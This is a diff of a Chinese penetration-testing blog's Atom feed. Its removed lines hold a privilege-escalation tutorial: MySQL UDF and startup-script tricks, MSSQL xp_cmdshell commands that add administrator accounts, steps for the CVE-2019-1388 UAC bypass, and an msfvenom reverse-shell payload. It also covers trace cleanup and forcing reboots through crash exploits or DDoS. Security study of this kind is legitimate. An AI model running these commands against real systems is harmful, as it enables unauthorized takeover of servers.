-</li>
-</ol>
-<p>‍</p>
-<h5>mysql-UDF提权</h5>
-<h6>UDF提权原理</h6>
-<p><span data-type="text" style="color: var(--b3-font-color8);">UDF(User Defined Function)用户自定义函数,支持用户自定义</span></p>
-<p>通过添加新的函数，<span data-type="text" style="color: var(--b3-font-color8);">对mysqI服务器进行功能扩充，从而创建函数，将MYSQL账号转化为系统system权限</span></p>
-<p>UDF提权是通过root权限导出udf.dll到系统目录下，可以<span data-type="text" style="color: var(--b3-font-color8);">通过udf.dll调用执行cmd</span></p>
-<h6>利用UDF提权条件</h6>
-<ol>
-<li>
-<p>Windows 2000、XP、2003</p>
-</li>
-<li>
-<ol start="2">
-<li>MySQL数据库版本</li>
-</ol>
-</li>
-<li>
-<p>3.账号具有对MySQL的插入和删除权限</p>
-</li>
-<li>
-<p>4.可以将udf.d写入到相应目录的权限</p>
-<p>​​</p>
-</li>
-</ol>
-<h6>MySQL-UDF提权步骤</h6>
-<ol>
-<li>
-<p>收集必要信息</p>
-<p>select version();   select user();    select @@basedir,    //获取数据库版本 //获取数据库用户 //获取数据库安装目录</p>
-</li>
-</ol>
-<p>​​</p>
-<ol start="2">
-<li>
-<p>MySQL版本高于5.1，创建导出文件夹</p>
-<p>/lib/plugin目录本身是不存在的，可以利用NTFS ADS流来创建文件夹</p>
-<div class="language-sql line-numbers-mode" data-highlighter="shiki" data-ext="sql" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-sql"><span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">select</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 'xxx'</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD"> into</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> dumpfile </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">'MySQL目录\\lib::$INDEX ALLOCATION'</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">;</span></span>
-<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">select</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 'xxx'</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD"> into</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> dumpfile </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">'MySQL目录\\lib\\plugin::$INDEX ALLOCATION'</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">;</span></span></code></pre>
-<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div></div></div><p>也可以利用webshell直接在mysql安装路径下创建piugin目录</p>
-</li>
-<li>
-<p>导入 udf.dl 文件</p>
-<p>DLL文件的获取方法:</p>
-<p>在 sqlmap/data/udf/mysq!/ 目录下,</p>
-<p>在Windows目录中有32位和64位dll文件(MySQL的位数，文件夹中的dll文件是通过异或编码的，可以使用sqlmap/extra/cloak.py进行解密</p>
-<p>将dll文件上传到mysql的/Iib/plugin目录下</p>
-<p>​​</p>
-</li>
-<li>
-<p>创建自定义函数</p>
-<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">create</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> function</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> sys_eval</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> returns</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> string</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> soname</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 'udf.dll'</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">;  </span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#创建自定义函数  需要创建.dll文件中存在的函数才可以</span></span>
-<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">select</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75"> sys_eval("net</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> user youze1 123456 /add</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">");   #创建用户</span></span>
-<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">select sys_eval("</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">net localgroup administrators youze1 /add</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"); #提升为管理员权限</span></span>
-<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">drop function sys_eval;  #清除痕迹</span></span>
-<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">delete from mysql.func where name="</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">sys_eval</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">";</span></span></code></pre>
-<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li>
-</ol>
-<p>​​</p>
-<h5>mysql启动项提权</h5>
-<h6>原理</h6>
-<p>将一段 VBS脚本导入到<span data-type="text" style="color: var(--b3-font-color8);">开机启动项中</span>，如果管理员重启了服务器，那么就会自动调用该脚本，并执行其中的用户添加 及提权命令</p>
-<h6>利用条件:</h6>
-<ol>
-<li>
-<p>上传到目录必须具备可读写的权限</p>
-</li>
-<li>
-<p>调用的 cmd 也必须有足够的权限</p>
-</li>
-<li>
-<p>重启服务器可以利用一些可导致服务器蓝屏的EXP，或者DDoS拒绝服务</p>
-</li>
-</ol>
-<h6>步骤</h6>
-<ol>
-<li>
-<p>如果可以直接上传到启动项目录就不需要使用数据库</p>
-<p>C:\Documents and Settings\All Users\「开始」菜单\程序\启动 目录存在可读写的权限</p>
-</li>
-<li>
-<p>进入test数据库，并创建一个新的表:</p>
-<p>create table a(cmd text)  // a表名，字段名cmd，text文本类型</p>
-</li>
-<li>
-<p>在表中插入数据</p>
-<div class="language-sql line-numbers-mode" data-highlighter="shiki" data-ext="sql" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-sql"><span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">insert into</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> a </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">values</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"set wshshell=createobject(""wscript.shell"")"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">); </span></span>
-<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">insert into</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> a </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">values</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"a=wshshell.run(""cmd.exe /c net user icg 123.com /add"" 0)"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">); </span></span>
-<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">insert into</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> a </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">values</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"b=wshshell.run(""cmd.exe /c net localgroup administrators icg /add"",0)"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">);</span></span></code></pre>
-<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li>
-<li>
-<p>输出表为一个 VBS 的脚本文件</p>
-<p>select * from a into dumpfile "C:\Documents and Settings\Administrator\「开始」菜单\程序启动\1.vbs"</p>
-</li>
-<li>
-<p>利用其他手段重启电脑</p>
-</li>
-</ol>
-<h5>MSSQL xp_cmdshell提权</h5>
-<ol>
-<li>
-<p>连接数据库之后</p>
-</li>
-<li>
-<p>查看相干信息</p>
-<div class="language-sql line-numbers-mode" data-highlighter="shiki" data-ext="sql" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-sql"><span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">--查看当前版本:</span></span>
-<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">select</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> @@</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">version</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> </span></span>
-<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">--判断当前是否为sa:</span></span>
-<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">select</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> is_srvrolemember</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">'sysadmin'</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">) </span></span>
-<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">--判断是否有public权限，可以爆破表:</span></span>
-<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">select</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> is_srvrolemember</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">'public'</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">) </span></span>
-<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">--判断当前用户写文件、读文件的权限:</span></span>
-<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">select</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> is_srvrolemember</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">'db_owner'</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span></code></pre>
-<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li>
-<li>
-<p>查看数据库中是否有 xp_cmdshell 扩展存储插件,返回值为 1则说明该数据库中有插件     MSSQL使用xp_cmdshell</p>
-<div class="language-sql line-numbers-mode" data-highlighter="shiki" data-ext="sql" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-sql"><span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">select</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> count</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(*) </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">from</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> master</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">dbo</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.sysobjects </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">where</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> xtype</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">'x'</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">and</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD"> name</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">'xp cmdshell'</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">;</span></span></code></pre>
-<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div></li>
-<li>
-<p>开启xp_cmdshell   MSSQL使用xp_cmdshell</p>
-</li>
-<li>
-<p>执行命令创建用户</p>
-<div class="language-sql line-numbers-mode" data-highlighter="shiki" data-ext="sql" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-sql"><span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">exec</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> master</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">xp_cmdshell</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 'net user youze 123456 /add'</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">       -- 添加用户ichungiu,密码123.com </span></span>
-<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">exec</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> master</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">xp_cmdshell</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ' net localgroup administrators youze /add'</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">       -- 添加ichunqiu到管理员组</span></span></code></pre>
-<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div></div></div></li>
-</ol>
-<h2>3.windows bypass UAC提权</h2>
-<h5>利用CVE-2019-1388实现bypass UAC</h5>
-<p>原理:</p>
-<p>如果在运行一个可执行文件的时候我们<span data-type="text" style="color: var(--b3-font-color8);">触发了 UAC</span>,在点击「展示证书发行者的详细信息」这个链接之后 可以看到证书里的 Issued by 字段,这个字段对应的值就是 OID。证书会解析 OID 的值,可能显示为超链接，但是 Windows 忘记禁用了 OID 处的超链接，这就给了我们提权的可能</p>
-<p>步骤</p>
-<ol>
-<li>
-<p>查看是否打补丁  systeminfo</p>
-</li>
-<li>
-<p>下载EXP:CVE-2019-1388/HHUPD.EXE  这里是开启http服务上传​</p>
-<p>​</p>
-</li>
-<li>
-<p>将exp下载到目标机中，并以管理员权限打开HHUPD.EXE,点击显示详细信息​</p>
-<p>​</p>
-</li>
-<li>
-<p>点击显示详细信息里的   "显示有关此发布者的证书的信息“</p>
-</li>
-<li>
-<p>将弹出的网页"另存为”，弹出位置不可用窗口后点击确定</p>
-</li>
-<li>
-<p>通过在保存网页的文件资源管理器的地址栏输入“C:\windows\system32\cmd.exe”打开cmd  这样才能继承浏览器的SYSTEM权限​</p>
-<p>​</p>
-</li>
-</ol>
-<h5>利用MSF的 bypassuac 模块</h5>
-<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">msfvenom</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -p</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> windows/meterpreter/reverse_tcp</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> lhost=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">192.168.61.20</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> lport=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">6666</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -f</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> exe</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -o</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> tests.exe</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">  #lhostiplport</span></span></code></pre>
-<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>​​</p>
-<p>​​</p>
-<p>​​</p>
-<p>​​</p>
-<p>​​</p>
-<p>​​</p>
-<p>​​</p>
-<p>通过一系列的前期渗透测试，已经获得了目标机器的meterpreter shell,当前权限为普通用户权限，可以尝试获取系统的System权限。</p>
-<p>​​</p>
-<h2>4.windows错误系统配置提权</h2>
-<p>...</p>
-<p>‍</p>
-]]></content>
-    <category term="渗透测试"/>
-    <published>2024-09-23T00:00:00.000Z</published>
-  </entry>
-  <entry>
-    <title type="text">命令执行和反序列化</title>
-    <id>https://min168.top/perm/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.html</id>
-    <link href="https://min168.top/perm/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.html"/>
-    <updated>2025-11-26T15:59:54.000Z</updated>
+    <title type="text">命令执行与反序列化漏洞利用实战</title>
+    <id>https://min168.top/perm/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AE%9E%E6%88%98.html</id>
+    <link href="https://min168.top/perm/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AE%9E%E6%88%98.html"/>
+    <updated>2026-07-26T07:49:45.000Z</updated>
     <summary type="html"><![CDATA[<p>目标：<br>
 1、熟悉整理<span data-type="text" style="color: var(--b3-font-color9);">命令执行</span>漏洞各<span data-type="text" style="color: var(--b3-font-color9);">函数</span>的使用<span data-type="text" style="color: var(--b3-font-color9);">方法和条件</span>，总结命令执行漏洞的<span data-type="text" style="color: var(--b3-font-color9);">利用方法</span>。<br>
 2、熟悉PHP反序列化漏洞<span data-type="text" style="color: var(--b3-font-color9);">魔法函数</span>的触发过程，了解<span data-type="text" style="color: var(--b3-font-color9);">pop链的</span>拓展内容后，完成ctf.php</p>]]></summary>
@@ -15481,10 +15438,42 @@ user--&gt;Root</p>
     <published>2023-07-09T00:00:00.000Z</published>
   </entry>
   <entry>
-    <title type="text">文件上传</title>
-    <id>https://min168.top/perm/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0.html</id>
-    <link href="https://min168.top/perm/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0.html"/>
-    <updated>2025-11-26T15:59:54.000Z</updated>
+    <title type="text">常见Web框架漏洞分析与利用</title>
+    <id>https://min168.top/perm/%E5%B8%B8%E8%A7%81Web%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8.html</id>
+    <link href="https://min168.top/perm/%E5%B8%B8%E8%A7%81Web%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8.html"/>
+    <updated>2026-07-26T07:49:45.000Z</updated>
+    <summary type="html"><![CDATA[<table>
+<thead>
+<tr>
+<th>漏洞名称</th>
+<th>漏洞原理</th>
+<th></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>ThinkPHP5.0.23 Remote Code Execution Vulnerability</td>
+<td><span data-type="text" style="color: var(--b3-font-color8);">获取method的方法中没有正确处理方法名，</span>导致攻击者可以调用Request类任意方法并构造利用链，从而导致远程代码执行漏洞。</td>
+<td></td>
+</tr>
+<tr>
+<td>Laravel CVE-2021-3129</td>
+<td>当Laravel开启了Debug模式时，由于Laravel自带的Ignition 组件对file_get_contents()和file_put_contents()函数的不安全使用，攻击者可以通过发起恶意请求，构造恶意Log文件等方式触发Phar反序列化，最终造成远程代码执行。</td>
+<td></td>
+</tr>
+</tbody>
+</table>]]></summary>
+    <content type="html"><![CDATA[<p>|漏洞名称|漏洞原理||<br>
+|</p>
+]]></content>
+    <category term="渗透测试"/>
+    <published>2023-05-12T00:00:00.000Z</published>
+  </entry>
+  <entry>
+    <title type="text">文件上传漏洞原理与绕过技巧</title>
+    <id>https://min168.top/perm/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E4%B8%8E%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7.html</id>
+    <link href="https://min168.top/perm/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E4%B8%8E%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7.html"/>
+    <updated>2026-07-26T07:49:45.000Z</updated>
     <summary type="html"><![CDATA[
 <h2>什么是文件上传漏洞？</h2>
 <p>文件上传漏洞是指程序员在开发任意文件上传功能时，并未考虑文件格式后缀的合法性校验或者是只考虑在前端通过js进行<br>
@@ -15630,42 +15619,10 @@ user--&gt;Root</p>
     <published>2023-03-17T00:00:00.000Z</published>
   </entry>
   <entry>
-    <title type="text">框架漏洞</title>
-    <id>https://min168.top/perm/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E.html</id>
-    <link href="https://min168.top/perm/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E.html"/>
-    <updated>2025-11-26T15:59:54.000Z</updated>
-    <summary type="html"><![CDATA[<table>
-<thead>
-<tr>
-<th>漏洞名称</th>
-<th>漏洞原理</th>
-<th></th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>ThinkPHP5.0.23 Remote Code Execution Vulnerability</td>
-<td><span data-type="text" style="color: var(--b3-font-color8);">获取method的方法中没有正确处理方法名，</span>导致攻击者可以调用Request类任意方法并构造利用链，从而导致远程代码执行漏洞。</td>
-<td></td>
-</tr>
-<tr>
-<td>Laravel CVE-2021-3129</td>
-<td>当Laravel开启了Debug模式时，由于Laravel自带的Ignition 组件对file_get_contents()和file_put_contents()函数的不安全使用，攻击者可以通过发起恶意请求，构造恶意Log文件等方式触发Phar反序列化，最终造成远程代码执行。</td>
-<td></td>
-</tr>
-</tbody>
-</table>]]></summary>
-    <content type="html"><![CDATA[<p>|漏洞名称|漏洞原理||<br>
-|</p>
-]]></content>
-    <category term="渗透测试"/>
-    <published>2023-05-12T00:00:00.000Z</published>
-  </entry>
-  <entry>
-    <title type="text">逻辑漏洞</title>
-    <id>https://min168.top/perm/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E.html</id>
-    <link href="https://min168.top/perm/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E.html"/>
-    <updated>2025-11-26T15:59:54.000Z</updated>
+    <title type="text">逻辑漏洞挖掘与利用实战指南</title>
+    <id>https://min168.top/perm/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B8%8E%E5%88%A9%E7%94%A8%E5%AE%9E%E6%88%98%E6%8C%87%E5%8D%97.html</id>
+    <link href="https://min168.top/perm/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B8%8E%E5%88%A9%E7%94%A8%E5%AE%9E%E6%88%98%E6%8C%87%E5%8D%97.html"/>
+    <updated>2026-07-26T07:49:45.000Z</updated>
     <summary type="html"><![CDATA[<h2>身份认证安全</h2>
 <p>绕过方法</p>
 <ol>
@@ -16191,10 +16148,10 @@ git config --global user.email 'xxx@163.com'</p>
     <published>2024-04-12T00:00:00.000Z</published>
   </entry>
   <entry>
-    <title type="text">FOFA</title>
-    <id>https://min168.top/perm/FOFA%E8%AF%AD%E6%B3%95.html</id>
-    <link href="https://min168.top/perm/FOFA%E8%AF%AD%E6%B3%95.html"/>
-    <updated>2025-11-26T15:59:54.000Z</updated>
+    <title type="text">FOFA搜索引擎高级语法与使用技巧</title>
+    <id>https://min168.top/perm/FOFA%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E9%AB%98%E7%BA%A7%E8%AF%AD%E6%B3%95%E4%B8%8E%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7.html</id>
+    <link href="https://min168.top/perm/FOFA%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E9%AB%98%E7%BA%A7%E8%AF%AD%E6%B3%95%E4%B8%8E%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7.html"/>
+    <updated>2026-07-26T07:49:45.000Z</updated>
     <summary type="html"><![CDATA[<p>高级搜索</p>
 <table>
 <thead>
@@ -16242,10 +16199,10 @@ git config --global user.email 'xxx@163.com'</p>
     <published>2023-01-10T00:00:00.000Z</published>
   </entry>
   <entry>
-    <title type="text">Google Hacking</title>
-    <id>https://min168.top/perm/Google%20Hacking.html</id>
-    <link href="https://min168.top/perm/Google%20Hacking.html"/>
-    <updated>2025-11-26T15:59:54.000Z</updated>
+    <title type="text">Google Hacking搜索引擎黑客技术实战</title>
+    <id>https://min168.top/perm/Google%20Hacking%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E9%BB%91%E5%AE%A2%E6%8A%80%E6%9C%AF%E5%AE%9E%E6%88%98.html</id>
+    <link href="https://min168.top/perm/Google%20Hacking%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E9%BB%91%E5%AE%A2%E6%8A%80%E6%9C%AF%E5%AE%9E%E6%88%98.html"/>
+    <updated>2026-07-26T07:49:45.000Z</updated>
     <summary type="html"><![CDATA[<h3>一、基础语法</h3>
 <ol>
 <li>加号（“+”）：加号表示强制搜索，即搜索结果中必须包含加号后面的内容。例如，“谷歌 +搜索引擎”会搜索到同时包含“谷歌”和“搜索引擎”的结果。</li>
@@ -16283,5 +16240,72 @@ git config --global user.email 'xxx@163.com'</p>
 ]]></content>
     <category term="渗透测试"/>
     <published>2023-02-23T00:00:00.000Z</published>
+  </entry>
+  <entry>
+    <title type="text">MSSQL注入漏洞深度复盘与实战</title>
+    <id>https://min168.top/perm/MSSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%BA%A6%E5%A4%8D%E7%9B%98%E4%B8%8E%E5%AE%9E%E6%88%98.html</id>
+    <link href="https://min168.top/perm/MSSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%BA%A6%E5%A4%8D%E7%9B%98%E4%B8%8E%E5%AE%9E%E6%88%98.html"/>
+    <updated>2026-07-26T07:49:45.000Z</updated>
+    <summary type="html"><![CDATA[<h2>MSSql</h2>
+<p>MSSql是指<span data-type="text" style="color: var(--b3-font-color8);">微软的SQLServer</span>数据库服务器，<span data-type="text" style="color: var(--b3-font-color8);">它是一个数据库</span>平台，提供数据库的从服务器到终端的完整的解决方案，其<br>
+中数据库服务器部分，是一个数据库管理系统，用于建立、使用和维护数据库。SQL Server默认开放的端口是TCP1433。</p>
+<h2>渗透角度介绍MSSql</h2>]]></summary>
+    <content type="html"><![CDATA[<h2>MSSql</h2>
+<p>MSSql是指<span data-type="text" style="color: var(--b3-font-color8);">微软的SQLServer</span>数据库服务器，<span data-type="text" style="color: var(--b3-font-color8);">它是一个数据库</span>平台，提供数据库的从服务器到终端的完整的解决方案，其<br>
+中数据库服务器部分，是一个数据库管理系统，用于建立、使用和维护数据库。SQL Server默认开放的端口是TCP1433。</p>
+<h2>渗透角度介绍MSSql</h2>
+<p>Microsoft SQL Sever分为很多个版本，随着版本的不断升级安全性也越来越高，渗透过程中最喜欢的版本应该就是<br>
+2008以前，<span data-type="text" style="color: var(--b3-font-color8);">在2008及其以后的版本数据库的权限已经不再是system</span>,相对于MySQL这个MSSql显得强大许多，他众多的功<br>
+能也给我们注入过程带来了便利，所以一般数据库为mssql支持多语句我们就考虑是不是应该直接拿下webshell。</p>
+<h2>MSSql视图和表</h2>
+<h3>表与视图区别？</h3>
+<p>表是存在物理记录的集合，而视图只是一串sq脚本;</p>
+<p>表需占用物理空间，而视图理论上可以不占用物理空间;</p>
+<p>视图可以将多个表呈现给用户，而表只可以呈现自身;</p>
+<p>视图可以随意删除和重建，而表的删除会导致数据丢失;</p>
